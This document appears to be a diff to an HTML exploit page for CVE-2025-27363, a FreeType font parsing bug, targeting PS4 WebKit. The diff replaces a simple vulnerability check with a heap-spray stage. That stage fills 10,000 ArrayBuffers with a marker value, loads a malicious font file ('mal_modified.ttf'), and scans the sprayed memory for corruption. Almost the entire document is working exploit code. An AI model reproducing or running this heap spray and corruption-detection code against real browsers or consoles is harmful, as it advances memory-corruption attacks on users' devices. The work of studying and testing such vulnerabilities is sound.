@@ -2,79 +2,81 @@
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>PoC CVE-2025-27363</title>
+  <title>Heap Spray + Glyph Test</title>
   <style>
-	/* Solo por las bromas, fondo negro y texto verde XD*/
-	/* ✅❌ por lo de la IA en PS no deberian de verse*/
     body {
-      font-family: monospace;
       background: #000;
       color: #0f0;
-      padding: 2em;
-      font-size: 18px;
+      font-family: monospace;
     }
     .log {
       white-space: pre-wrap;
-      margin-top: 2em;
+      margin-top: 1em;
       background: #111;
       padding: 1em;
       border: 1px solid #0f0;
     }
-    .status {
-      margin-top: 2em;
-      font-size: 32px;
-    }
-    .ok {
-      color: lime;
-    }
-    .fail {
-      color: red;
-    }
-    .glyph-test {
-      font-size: 100px;
-      margin-top: 0em;
-    }
   </style>
 </head>
 <body>
-  <h1>✅ PS4-FreeType-WebKit-Poc ❌</h1>
-  <div class="glyph-test" id="glyph">%%%%%%%%%%%</div>
-  <button onclick="startPoC()">Start</button>
-  <div class="log" id="log">Esperando...</div>
-  <div class="status" id="status">Sin Iniciar</div>
-
+  <h1>Heap Spray + Glyph Test</h1>
+  <div id="glyph">%</div>
+  <button onclick="start()">Start</button>
+  <div class="log" id="log">Waiting...</div>
 
   <script>
-    const logElem = document.getElementById('log');
-    const statusElem = document.getElementById('status');
-    const glyphElem = document.getElementById('glyph');
-
     const log = msg => {
-      logElem.innerText += msg + "\n";
+      document.getElementById('log').innerText += msg + "\n";
     };
 
-    async function startPoC() {
-      logElem.innerText = "Iniciando PoC...\n";
-      statusElem.innerText = "";
-      glyphElem.style.fontFamily = "monospace";
-      glyphElem.style.color = "#0f0";
+    let spray = [];
 
-      const font_face = new FontFace('foo', 'url("mal.ttf")');
+    function heap_spray() {
+      log("[*] Heap spraying ArrayBuffer(0x1000) x 10000...");
+      for (let i = 0; i < 10000; i++) {
+        let ab = new ArrayBuffer(0x1000);
+        let dv = new DataView(ab);
+        // Initialize with known pattern
+        for (let j = 0; j < 0x1000; j += 4) {
+          dv.setUint32(j, 0xdeadbeef, true);  // Known value
+        }
+        spray.push(dv);
+      }
+      log("[+] Heap sprayed!");
+    }
+
+    async function start() {
+      heap_spray();
+
+      log("[*] Loading malicious font...");
+      const font_face = new FontFace('foo', 'url("mal_modified.ttf")');
 
       try {
         await font_face.load();
-        log("✅ Font loaded.");
         document.fonts.add(font_face);
-        glyphElem.style.fontFamily = 'foo';
-        glyphElem.style.color = 'red';
-        log("✅ Font used.");
-        statusElem.className = "ok";
-        statusElem.textContent = "✅ Fuente aplicada correctamente. Si ves los simbolos `%` Poc correcta, sistema vulnerable. No visibles, sistema parcheado.";
+        document.getElementById('glyph').style.fontFamily = 'foo';
+        log("[+] Font loaded and applied.");
       } catch (err) {
-        log("❌ Font failed to load.");
-        statusElem.className = "fail";
-        statusElem.textContent = "❌ Error al cargar fuente. PoC no ejecutada.";
+        log("[-] Error loading font:", err);
+        return;
       }
+
+      log("[*] Scanning for corruption...");
+      detect_corruption();
+    }
+
+    function detect_corruption() {
+      for (let i = 0; i < spray.length; i++) {
+        try {
+          let val = spray[i].getUint32(0, true);
+          if (val !== 0xdeadbeef) {
+            log(`[!] Corruption detected at index ${i}: 0x${val.toString(16)}`);
+          }
+        } catch (e) {
+          // Skip unreadable regions
+        }
+      }
+      log("[*] Scan complete.");
     }
   </script>
 </body>
